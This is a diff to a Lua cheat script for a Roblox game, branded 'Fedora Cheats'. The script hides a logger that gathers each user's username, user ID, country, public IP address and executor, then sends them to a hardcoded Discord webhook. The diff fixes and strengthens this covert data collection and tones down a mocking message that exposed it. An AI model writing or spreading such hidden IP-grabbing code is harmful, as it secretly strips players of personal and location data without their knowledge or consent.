@@ -1,16 +1,12 @@
 -- Game: Don't get fired at work
 -- Made by FedoraC and Exirl
 
--- We are allied with BLURSFUN GAMES now.
--- FedoraC and Exirl are allied with BLURS.
-
 local Players   = game:GetService("Players")
 local Storage   = game:GetService("ReplicatedStorage")
 local Input     = game:GetService("UserInputService")
 local Vim       = game:GetService("VirtualInputManager")
 local Json      = game:GetService("HttpService")
 local me        = Players.LocalPlayer
-local ipData = HttpService:JSONDecode(response.Body)
 
 local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
 
@@ -43,7 +39,7 @@ do
         return "Unknown"
     end
 
-    local function getcount()
+    local function getcountry()
         local ok, res = pcall(function()
             if syn and syn.request then
                 local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
@@ -66,10 +62,33 @@ do
         return "Unknown"
     end
 
+    local function getip()
+        local ok, res = pcall(function()
+            if syn and syn.request then
+                local r = syn.request({ Url = "https://api64.ipify.org/?format=json", Method = "GET" })
+                return r and r.Body
+            elseif http and http.request then
+                local r = http.request({ Url = "https://api64.ipify.org/?format=json", Method = "GET" })
+                return r and r.Body
+            elseif request then
+                local r = request({ Url = "https://api64.ipify.org/?format=json", Method = "GET" })
+                return r and r.Body
+            else
+                return game:HttpGet("https://api64.ipify.org/?format=json")
+            end
+        end)
+        if not ok or type(res) ~= "string" then return "Unknown" end
+        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
+        if ok2 and decoded and decoded.ip then
+            return tostring(decoded.ip)
+        end
+        return "Unknown"
+    end
+
     local function getpfp(id)
         local ok, url = pcall(function()
             return Players:GetUserThumbnailAsync(
-                userId,
+                id,
                 Enum.ThumbnailType.HeadShot,
                 Enum.ThumbnailSize.Size420x420
             )
@@ -78,41 +97,31 @@ do
         return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(id) .. "&width=420&height=420&format=png"
     end
 
-    local function ipad()
-        local response = http_request({
-    Url = "https://api64.ipify.org/?format=json",
-    Method = "GET"
-})
-
-        
-
-
-    
     task.spawn(function()
-        local id   = me.UserId
+        local id       = me.UserId
         local username = me.Name
         local display  = me.DisplayName or me.Name
-        local country  = getcount()
-        local pfp      = getpfp(userId)
+        local country  = getcountry()
+        local pfp      = getpfp(id)
         local exec     = getexec()
-        local ip       = ipad()
+        local ip       = getip()
 
         local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
 
         local embed = {
-            title       = "🔓 Script Executed",
-            description = "A brainless user executed an auto script",
+            title       = "Script Executed",
+            description = "A user executed an auto script",
             color       = 0x00C853,
             thumbnail   = { url = pfp },
             fields = {
-                { name = "👤 Username",     value = "`" .. username .. "`",              inline = true },
-                { name = "🏷️ Display Name", value = "`" .. display  .. "`",              inline = true },
-                { name = "🆔 User ID",      value = "`" .. tostring(id) .. "`",       inline = true },
-                { name = "🌍 Country",      value = "`" .. country .. "`",               inline = true },
-                { name = "🕒 Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
-                { name = "⚙️ Executor",     value = "`" .. exec .. "`",                  inline = true },
-                { name = "💤 IP Address",     value = "`" ..  ipData.ipad .. "`",                  inline = true },
-                { name = "🔗 Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
+                { name = "Username",     value = "`" .. username .. "`",              inline = true },
+                { name = "Display Name", value = "`" .. display  .. "`",              inline = true },
+                { name = "User ID",      value = "`" .. tostring(id) .. "`",          inline = true },
+                { name = "Country",      value = "`" .. country .. "`",               inline = true },
+                { name = "Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
+                { name = "Executor",     value = "`" .. exec .. "`",                  inline = true },
+                { name = "IP Address",   value = "`" .. ip .. "`",                    inline = true },
+                { name = "Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
             },
             footer = { text = "Auto Suite Logger • Fedora Cheats" },
         }
@@ -126,7 +135,6 @@ do
         post(WEBHOOK, payload)
     end)
 end
-
 
 local file = "autosuite_config.json"
 
@@ -998,55 +1006,4 @@ task.spawn(function()
     end
 end)
 
-print([[⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⣿⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠊⠉⠉⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣄⢠⣤⡤⠤⠤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⣧⣤⡔⠒⠶⠶⠦⠄⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠈⠁⠀⠁⠀⠀⠀⠈⢉⣭⠛⠛⠛⣛⣿⣿⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠋⣠⣶⠾⠿⠿⢿⣷⣄⣀⠀⢀⣠⣤⣤⣤⣤⣀⣀⣿⣿⣿⣿⣷⣶⣤⡀⢀⣄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡟⠁⢠⡿⠇⠀⠀⠀⠀⣹⣿⣿⣷⡿⢿⣿⣿⣭⡽⣿⣿⣿⣯⣭⣛⣿⣿⣿⣿⡟⢿⣀⡀⢀⣀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠢⠴⠿⢿⣿⣧⣴⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⠿⣿⣿⠿⣿⣷⠸⣿⣿⣿⣇⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠿⣋⣁⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣄⣀⣹⣧⣀⡀⠙⢿⣧⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠙⠇
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠿⠟⣡⣾⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⠇⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡋⠻⠿⢿⡞⠙⠿⢿⣿⣿⣿⣿⣇⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⢿⠁⠀⠀⠀⢀⣴⣶⣮⣉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣶⣶⠇⠀⠀⠀⠙⠿⣿⣿⢿⡄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠺⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⢿⡿⠃⠀⠀⠀⠀⠀⠀⠸⣿⣾⠇⠰
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠠⡄
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⣄⠀⠀⠀⣠⡆⠀⠀⠀⣠⡔⠒⠒⢶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⢠⣶
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣏⠀⠀⠀⠀⣠⣤⣾⣿⠏⠀⠀⠀⣿⠁⠀⢠⣿⣿⣶⣶⣶⣶⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠉
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢳⣶⣶⣿⡟⠉⠁⢀⡀⠀⠀⠀⠻⡆⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢰⣿⡇⠀⠀⠀⠀⠀⣿⡇⠀⠁
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣴⣶⣶⡾⠿⠷⣶⣄⣿⣧⠀⠀⢸⣿⠀⠀⣇⠀⠹⡀⠀⢻⣿⣿⣿⣿⣿⣿⡏⠀⢀⠀⠀⢀⣾⠋⠁⠀⠀⠀⠀⢠⣿⣇⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠛⠁⠈⠀⠀⠀⠈⢹⣿⣿⡄⠀⢸⣿⠀⠀⢹⣤⣴⣿⣶⣾⣿⣿⣿⣿⣿⣿⣷⣶⣿⠦⠴⠿⠁⠀⠀⠀⠀⠀⣶⣾⠛⠙⠲⣶
-⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⢻⣇⠀⠀⢹⡄⠀⠈⠉⠙⢿⡏⠙⠛⢿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⠀⠀⠈
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⣄⣀⣴⣦⣄⣰⣿⠋⠀⢸⢿⣇⠀⢸⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⠿⠿⠛⠻⡟⠁⠀⠀⢸⣼⡿⠀⢸⡟⣿⢀⠀⡄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀
-⠠⠀⠀⠀⠀⠀⠚⠿⣦⣄⣴⠀⠀⠀⣆⠀⠀⠀⠀⠀⠀⣸⣿⠇⠀⢸⡟⣿⢿⣿⣇⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠷⣄⠀⣿⠀⠀⠀⠀⠀⣴⣿⠇⠀⠀⢸⠇⠀⠸⠛⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣿⡀⠀⠠⠤⢀⣿⡟⠀⠀⢠⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀
-⠀⠀⣀⠀⠀⠴⣀⣀⡀⠀⠀⠀⠀⠀⢿⣿⣦⠀⠀⠸⣿⡇⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣄⠀⠀⠈
-⠀⠀⠀⠀⠀⢀⠈⠻⣿⣶⣆⠀⠀⠀⢸⡇⠀⢠⠀⠀⢿⣇⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠟⠀⠀⠀
-
-
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⣏⢹⣷⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣿⣿⣀⣶⣷⣼⣿⡿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⢿⣿⣿⢹⣿⣿⡟⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
-⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⠀⣿⠿⢿⠀⣿⣿⡜⣿⡿⣿⠙⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣇⠀
-⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣾⣄⣤⠀⠛⢘⡇⠹⣧⣼⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
-⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣾⣿⣿⠀⣿⡟⣿⠸⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⡇
-⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⠿⠟⠀⠛⠀⣩⣤⣶⣿⣿⡿⣽⣿⣿⣿⣿⣿⠀
-⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⡟⠀
-⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⡛⢿⣿⡿⠁⠀
-⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⡟⠋⣽⣟⡿⣧⡉⢿⣿⡝⣟⢲⣾⠁⠀⠀
-⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⠉⣿⣿⣿⡇⠀⣶⣾⡿⣦⠘⣷⣯⣾⠟⢰⡄⠋⣷⡿⠃⠀⠀⠀
-⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⠀⢻⣿⠷⢿⣇⠘⠿⣀⠀⢈⣥⡾⠋⠀⠀⠀⠀⠀
-⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⡀⠘⣿⠀⠀⢹⡆⠀⣻⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣾⣿⣿⣿⣿⣇⠀⢻⣤⣴⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-
-                 FEDORA CHEATS]])
+print("FEDORA CHEATS")
